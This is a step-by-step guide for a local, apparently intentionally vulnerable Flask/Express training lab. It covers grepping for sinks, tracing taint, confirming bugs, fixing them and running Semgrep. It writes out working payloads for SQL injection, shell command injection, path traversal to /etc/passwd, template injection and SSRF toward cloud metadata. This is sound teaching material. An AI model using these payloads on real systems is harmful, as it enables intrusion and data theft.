# GUIDE: grep → trace → pwn

Work through this with the apps running (see [README](README.md)). Pick Flask or Express,
the bugs are identical. Commands below show the vulnerable Flask app on `:5001`. Swap
`5001` → `3000` and `.py` → `.js` for Express. The *fixed* copies sit on `:5002` / `:3002`,
you'll use them in step 4.

Have [SINKS.md](SINKS.md) open in another tab.

---

## 0. Orient (2 min)

Don't read the code yet. Look at the attack surface.

```bash
curl -s http://localhost:5001/
```

Six routes, each takes a query param. Six potential **sources**. Write them down:

```
/user?id=    /ping?host=    /docs?name=    /hello?name=    /fetch?url=    /order?id=
```

Now count lines:

```bash
wc -l flask_app/*.py
```

~150 lines. You could read it all. Real codebases are 150k. So we don't read. We grep.

---

## 1. GREP: find the sinks (5 min)

Sinks are finite. Take the Python one-liner from SINKS.md:

```bash
grep -rnE "eval\(|exec\(|os\.system|subprocess|\.execute\(|open\(|pickle\.loads|render_template_string|requests\.(get|post)|redirect\(" --include=*.py flask_app/
```

You should get roughly:

```
flask_app/app.py:     render_template_string("<h1>Hello " + name + "</h1>")
flask_app/app.py:     r = requests.get(url, timeout=3)
flask_app/db.py:      cur.execute(sql)
flask_app/utils.py:   out = subprocess.run(cmd, shell=True, ...)
flask_app/utils.py:   with open(path) as f:
```

Five sinks. Each one is a question: **where does this argument come from?**

Notice three of them are in `db.py` and `utils.py`, not in the route file. The route calls a
helper, the helper calls the sink. That's normal. Now grep for the **wrappers**:

```bash
grep -rnE "run_cmd|read_doc|get_user|get_order|_query" --include=*.py flask_app/
```

Now you have the call graph without reading anything.

> **Express**: same exercise with the JS one-liner. Sinks land in `db.js` and `utils.js`.

---

## 2. TRACE: follow the argument back (10 min)

### Worked example: Flow 1

Start at the sink in `db.py`:

```python
cur.execute(sql)          # sink. where does sql come from?
```

One hop up, same file:

```python
def get_user(uid):
    sql = "SELECT ... WHERE id = " + uid      # sql built from uid. where does uid come from?
```

Who calls `get_user`? Your wrapper grep said `app.py`:

```python
@app.route("/user")
def user():
    uid = request.args.get("id", "1")        # SOURCE. attacker controls uid.
    return jsonify(get_user(uid))
```

Path: `request.args["id"]` → `uid` → `get_user(uid)` → `sql` → `cur.execute(sql)`

Anything between source and sink that cleans it? No `int()`, no parameterised query, no
allowlist. **Candidate confirmed.** Write it in your notebook:

```
#1  SQLi   request.args[id] → get_user → _query → cur.execute   sanitizer: none
```

### Your turn: Flows 2–5

Fill in the table. Backward from each sink.

| # | Sink (file:line) | Hops back | Source | Sanitizer? |
|---|---|---|---|---|
| 1 | `db.py` `cur.execute` | `_query` ← `get_user` ← `user()` | `request.args[id]` | none |
| 2 | `utils.py` `subprocess.run` | | | |
| 3 | `utils.py` `open` | | | |
| 4 | `app.py` `render_template_string` | | | |
| 5 | `app.py` `requests.get` | | | |

### The decoy: `/order`

`get_order` in `db.py` looks *identical* to `get_user`. Same f-string, same `_query`. Trace it
back to the route:

```python
return jsonify(get_order(int(oid)))
```

`int()` is a sanitizer. A non-numeric payload throws before reaching the sink. **Not
exploitable.** But note where the fix lives: at the *caller*. Add a second caller that forgets
`int()` and the bug is back. We'll come back to this in step 4.

<details>
<summary>hints (one nudge per flow, try these before the answers)</summary>

- **2**: the sink is in `utils.py`. What's the function wrapping it called? Grep that name.
- **3**: `os.path.join("docs", "../../x")` — what does that evaluate to? Try it in a REPL.
- **4**: no hops. Look at what's *inside* the string passed to the sink. Is the user's input the data, or the code?
- **5**: no hops either. Is there anything checking the scheme or the host before the request goes out?

</details>

<details>
<summary>answers</summary>

| # | Hops back | Source | Sanitizer? |
|---|---|---|---|
| 2 | `run_cmd` ← `ping()` | `request.args[host]` | none. string concat into shell=True |
| 3 | `read_doc` ← `docs()` | `request.args[name]` | none. `os.path.join` doesn't strip `../` |
| 4 | none, same function | `request.args[name]` | none. user string IS the template |
| 5 | none, same function | `request.args[url]` | none. no scheme/host allowlist |

</details>

---

## 3. PWN: prove it (10 min)

A traced path is a *candidate*. It's a bug when a payload survives every hop and does
something at the sink. Half your candidates die here in real life. That's normal.

Confirm each one. Start with a harmless probe, then escalate.

Short on time? `./check.sh` fires every payload below and prints PASS/FAIL. Use it to confirm
after you've done at least one by hand.

### Flow 1: SQLi

Probe: does a quote break it?

```bash
curl -s "http://localhost:5001/user?id=1'"
```

500 error → the quote reached SQL. Now extract something:

```bash
curl -s "http://localhost:5001/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"
```

You should see `FLAG{sqli_union_select_works}`. **Pwned.**

Now try the same against the decoy:

```bash
curl -s "http://localhost:5001/order?id=1%20UNION%20SELECT%201,2,3"
```

Flask: 500 from `int()`. Express: 200, but `parseInt("1 UNION...")` silently returns `1`, so
your payload was stripped and you get order 1. Either way: candidate dead. This is what a
sanitizer looks like from the outside, a crash or a clean answer, never your payload.

### Flow 2: Command injection

Probe:

```bash
curl -s "http://localhost:5001/ping?host=127.0.0.1%3Bid"
```

Output of `id` after the ping → shell metachar survived. Escalate:

```bash
curl -s "http://localhost:5001/ping?host=127.0.0.1%3Bcat%20/app/secret/flag.txt"
```

### Flow 3: Path traversal

```bash
curl -s "http://localhost:5001/docs?name=..%2F..%2Fsecret%2Fflag.txt"
```

`DOCS_DIR` is `/app/flask_app/docs`. Two `..` gets you to `/app`. Try `/etc/passwd` too.

### Flow 4: SSTI

Probe. If it renders `49`, the template engine evaluated your input:

```bash
curl -s "http://localhost:5001/hello?name={{7*7}}"
```

Express uses EJS, different syntax, same bug:

```bash
curl -s "http://localhost:3000/hello?name=<%25=7*7%25>"
```

Both engines can reach the host language from a template. Escalating to code execution is
your exercise: search "jinja2 SSTI" / "ejs SSTI" payloads, try them, see what each engine
exposes. The point for now: the user string *is* the template, not data inside it.

### Flow 5: SSRF

The server fetches whatever URL you give it. Use it to reach something *you* can't reach
directly. The Express app is on the same container:

```bash
curl -s "http://localhost:5001/fetch?url=http://127.0.0.1:3000/user?id=1"
```

In the real world this is cloud metadata (`http://169.254.169.254/`), internal admin panels,
or chaining into Flow 1 on an internal service.

---

## 4. FIX: where does the fix go? (5 min)

You now have 5 confirmed bugs. Fix Flow 1 two ways and compare.

**Fix at source** (like the decoy):

```python
return jsonify(get_user(int(uid)))
```

Works. Fragile. Every future caller of `get_user` must remember to do it.

**Fix at sink**:

```python
def get_user(uid):
    sql = "SELECT id, username, email FROM users WHERE id = ?"
    return {"sql": sql, "rows": _query(sql, (uid,))}
```

Now `get_user` is safe for every caller forever. **Fix at the sink.** Same logic for the rest:

| # | Sink-side fix |
|---|---|
| 2 | `subprocess.run(["ping", "-c", "1", host])`, no `shell=True` |
| 3 | `realpath(path).startswith(realpath(DOCS_DIR))` or reject `..` |
| 4 | `render_template_string("<h1>Hello {{ name }}</h1>", name=name)`, user data as *context*, not template |
| 5 | parse URL, allowlist scheme `http(s)` and host |

Do it, rerun your payloads, watch them die.

### 4b. Compare with the fixed service

You don't have to write the fixes to see them. `flask_app_fixed/` is the same app with every
sink fixed at the sink, running on `:5002`. Same payload, two curls:

```bash
curl -s "http://localhost:5001/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"
curl -s "http://localhost:5002/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"
```

Flag on the first, empty rows on the second. Now look at exactly what changed:

```bash
diff -u flask_app/db.py flask_app_fixed/db.py
diff -u flask_app/utils.py flask_app_fixed/utils.py
diff -u flask_app/app.py flask_app_fixed/app.py
```

Every hunk is a sanitizer, and every sanitizer matches its sink: `?` for SQL, an argument list
for the shell, `realpath` + prefix check for the path, data-as-context for the template, a
host allowlist for the URL. Nothing else moved.

`./check.sh` runs both sides: on the vulnerable side PASS means the exploit worked, on the
fixed side PASS means it was blocked.

---

## 5. AUTOMATE: let Semgrep grep+trace for you (5 min)

You just did by hand what taint analysis does at scale. Run the included rules:

```bash
docker run --rm -v "$PWD:/src" semgrep/semgrep semgrep scan --config /src/semgrep /src/flask_app
```

Look at `semgrep/flask.yml`. Two rules:

- `flask-taint-builtin-sinks`: sources = `request.args`, sinks = the stdlib functions from
  SINKS.md. This finds **Flow 4 and 5 only**. Why? Semgrep's free taint tracking is
  intra-procedural. It won't follow `uid` into `get_user()` in another file.
- `flask-taint-with-wrappers`: same, plus `get_user`, `run_cmd`, `read_doc` as sinks. Now it
  finds **all 5**, and skips the decoy because `int(...)` is declared a sanitizer.

> **Express** (`semgrep/express.yml`, run against `/src/express_app`): the builtin rule finds
> 4 of 5, not 2. `res.send` is a sink, and taint flows *through* `runCmd()` / `readDoc()`
> return values back into it. Only `/user` (→ `res.json`) escapes. Same fix: add the
> wrappers, get all 5. Decoy skipped in both via `parseInt`.

Now run the same rules on the fixed app:

```bash
docker run --rm -v "$PWD:/src" semgrep/semgrep semgrep scan --config /src/semgrep/flask.yml /src/flask_app_fixed
```

The builtin rule is quiet: the rule names `safe_url` and `safe_path` as sanitizers, the
template sink only counts its *template* argument, and `cursor.execute(sql, params)` gets a
constant. The wrapper rule still flags every route that calls a wrapper (`/user`, `/ping`,
`/docs`, `/order`), because we told it those wrappers are sinks and never told it the fix made
that false. Keep your sink list honest both ways.

> **Express**: the builtin rule keeps firing on the fixed app too, for `/ping`, `/docs` and
> `/fetch`. `res.send` is a sink, and the *output* of `runCmd` / `readDoc` / `fetch` is still
> derived from user input, so taint flows through. Those are false positives: the dangerous
> call is gone, the echo isn't. Step 3 exists for exactly this reason.

That's the lesson. **Tools are only as good as your sink list.** You did step 1 (grep the
wrappers) so you could teach the tool. CodeQL does cross-function tracing out of the box but
costs a build step. Both give *candidates*. Step 3 is still yours.

---

## 6. HOMEWORK: AI as a junior auditor

Point an LLM at `flask_app/` and ask:

> List every path from `request.args` to a function that executes SQL, a shell command, or
> opens a file. For each, name the sanitizer if any.

Compare against your table from step 2. Note what it missed, what it invented, and whether it
caught the decoy. Treat it exactly like Semgrep: candidates in, verification by you.

Then go find a real codebase you already know. Run the grep from SINKS.md. Every hit, ask:
**where does this come from?**

That's the whole job.

---

## 7. CLEAN UP

You're running a container with five remote-code-execution bugs in it. Don't leave it up.

```bash
docker stop gtp
```

`--rm` on the run command removes the container when it stops. Check nothing is left:

```bash
docker ps
```

To free the disk space too:

```bash
docker rmi ghcr.io/sdqmd/grep-trace-pwn
```

If you forgot `--name gtp`, `docker ps` shows the container id; `docker stop <id>`.
